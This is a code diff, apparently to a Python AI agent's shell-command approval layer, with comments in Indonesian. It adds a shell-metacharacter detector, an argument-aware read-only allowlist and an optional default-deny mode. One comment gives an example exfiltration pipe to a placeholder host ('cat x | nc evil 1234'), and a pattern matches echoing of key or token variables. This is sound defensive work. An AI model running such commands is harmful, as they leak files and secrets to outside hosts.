@@ -111,6 +111,71 @@ _ENV_DUMP_PATTERNS: list[str] = [
     r"\$\{?[a-z_]*(key|token|secret|password|passwd)[a-z_]*\}?",  # echo $API_KEY (command dinormalisasi ke lowercase)
 ]
 
+# ── H-04: metakarakter shell = command majemuk (HARUS approval) ─────────
+# Bila command mengandung separator/metakarakter shell (; | & && || ` $()
+# > < newline), itu adalah command majemuk. First-word check tidak bisa
+# dipercaya karena bagian SETELAH separator bebas (mis. `ls; python -c …`,
+# `cat x | nc evil 1234`). Command majemuk SENANTIASA butuh approval eksplisit.
+_SHELL_METACHAR_RE = re.compile(
+    r"(?:;|\|\||&&|\||`|\$\(|\$\{|\bnewgrp\b|>|<|\n)"
+)
+
+# ── H-04: allowlist read-only TERSTRUKTUR (argumen sadar) ───────────────
+# Daftar command read-only yang boleh auto-jalan (tanpa approval) — diperiksa
+# berdasarkan struktur token, bukan sekadar first-word, agar `python -c …`
+# (eksekusi kode) / `git push` (mutasi) TIDAK dianggap aman walau first-word
+# (`python`/`git`) terdaftar. Hanya pasangan (program, sub-perintah aman)
+# yang eksplisit diizinkan.
+# Format: { program: { pola arg yang aman (regex, dicocokkan ke sisa command) } }
+# Pola `^$` artinya "tanpa argumen".
+_SAFE_READONLY_PROGRAMS: dict[str, list[re.Pattern]] = {
+    "ls":   [re.compile(r"^[A-Za-z0-9 _./\-]+$")],            # ls -la /dir
+    "dir":  [re.compile(r"^[A-Za-z0-9 _./\-]+$")],
+    "pwd":  [re.compile(r"^$")],
+    "echo": [re.compile(r"^[A-Za-z0-9 _./\-:]+$")],           # echo teks polos
+    "grep": [re.compile(r"^[A-Za-z0-9 _./\-*:]+$")],
+    "find": [re.compile(r"^[A-Za-z0-9 _./\-*]+$")],
+    "which":   [re.compile(r"^[A-Za-z0-9 _./\-]+$")],
+    "whoami":  [re.compile(r"^$")],
+    "hostname":[re.compile(r"^$")],
+    "uname":   [re.compile(r"^[A-Za-z\-]+$")],                # uname -a
+    "date":    [re.compile(r"^[A-Za-z0-9 +:./\-]+$")],
+    "df":      [re.compile(r"^[A-Za-z0-9 _./\-]+$")],
+    "du":      [re.compile(r"^[A-Za-z0-9 _./\-]+$")],
+    "free":    [re.compile(r"^[A-Za-z\-]+$")],                # free -h
+    "ps":      [re.compile(r"^[A-Za-z0-9 _./\-]+$")],
+    "python":  [re.compile(r"^\-\-version$"), re.compile(r"^\-v$")],   # HANYA versi
+    "python3": [re.compile(r"^\-\-version$"), re.compile(r"^\-v$")],
+    "node":    [re.compile(r"^\-\-version$"), re.compile(r"^\-v$")],
+    "git":     [re.compile(r"^status\b"), re.compile(r"^log\b"), re.compile(r"^diff\b"),
+                re.compile(r"^show\b"), re.compile(r"^branch$"), re.compile(r"^remote\b")],
+}
+
+
+def has_shell_metacharacter(command: str) -> bool:
+    """True bila command memuat separator/metakarakter shell (command majemuk).
+
+    Diperiksa terhadap command mentah (bukan hasil normalisasi) karena
+    normalisasi ``re.sub(r\"\\s+\",\" \")`` menghapus newline — padahal newline
+    adalah salah satu vektor injeksi command."""
+    return bool(_SHELL_METACHAR_RE.search(command or ""))
+
+
+def is_safe_readonly(command: str) -> bool:
+    """True bila command TERSTRUKTUR aman (read-only, tanpa metakarakter shell,
+    argumen cocok pola allowlist). Bukan sekadar cek first-word: `python -c …`
+    atau `git push` mengembalikan False walau programnya terdaftar."""
+    norm = _normalize_command(command)
+    if not norm or has_shell_metacharacter(command):
+        return False
+    tokens = norm.split()
+    program = tokens[0]
+    rest = " ".join(tokens[1:])
+    patterns = _SAFE_READONLY_PROGRAMS.get(program)
+    if not patterns:
+        return False
+    return any(pat.match(rest) for pat in patterns)
+
 # Direktori yang boleh diakses agent (root). Batasi ke HOME + cwd proses.
 # Bisa dipersempit lewat env BOTNESIA_AGENT_ROOTS (path dipisah ':').
 def _allowed_roots() -> list[str]:
@@ -177,12 +242,43 @@ def _audit_agent_command(command: str, *, decision: str, cwd: str) -> None:
         pass
 
 
+def _strict_allowlist_enabled() -> bool:
+    """Strict allowlist mode (default-deny). Aktif via env
+    BOTNESIA_AGENT_STRICT_ALLOWLIST=1. Saat aktif, HANYA command yang lolos
+    ``is_safe_readonly`` yang auto-jalan; command lain (termasuk yang dulu
+    lolos via first-word lemah) butuh approval. Default OFF = backward-compat."""
+    return os.environ.get("BOTNESIA_AGENT_STRICT_ALLOWLIST", "").strip() in ("1", "true", "yes", "on")
+
+
 def is_dangerous(command: str) -> bool:
+    """Tentukan apakah command butuh approval eksplisit user.
+
+    Sejak hardening H-04:
+    1. Pola berbahaya (DANGEROUS_PATTERNS) → selalu butuh approval.
+    2. Command majemuk (mengandung metakarakter shell ``;|&`$()><``) → selalu
+       butuh approval, karena first-word aman tidak menjamin bagian setelah
+       separator (mis. ``ls; python -c …``).
+    3. Program yang ada di allowlist terstruktur (``_SAFE_READONLY_PROGRAMS``)
+       dievaluasi argumennya: cocok pola → aman; tidak cocok (mis.
+       ``python -c …``, ``git push``) → butuh approval. TIDAK jatuh ke
+       first-word check lemah agar celah eksekusi-kode tertutup.
+    4. Program LAIN (belum terdaftar): mode backward-compat memakai first-word
+       check lama; strict mode (BOTNESIA_AGENT_STRICT_ALLOWLIST=1) = default-deny."""
     cmd_lower = command.lower()
     if any(p.lower() in cmd_lower for p in DANGEROUS_PATTERNS):
         return True
-    first_word = cmd_lower.split()[0] if cmd_lower.split() else ""
-    return first_word not in [c.split()[0] for c in SAFE_READONLY_COMMANDS]
+    # Command majemuk = selalu butuh approval (first-word tidak bisa dipercaya).
+    if has_shell_metacharacter(command):
+        return True
+    tokens = cmd_lower.split()
+    program = tokens[0] if tokens else ""
+    # Program terdaftar → evaluasi argumen (argumen sadar, bukan first-word).
+    if program in _SAFE_READONLY_PROGRAMS:
+        return not is_safe_readonly(command)
+    # Program tak terdaftar: strict = default-deny; backward-compat = first-word.
+    if _strict_allowlist_enabled():
+        return True
+    return program not in [c.split()[0] for c in SAFE_READONLY_COMMANDS]
 
 
 async def ask_approval(tool: str, description: str) -> bool:
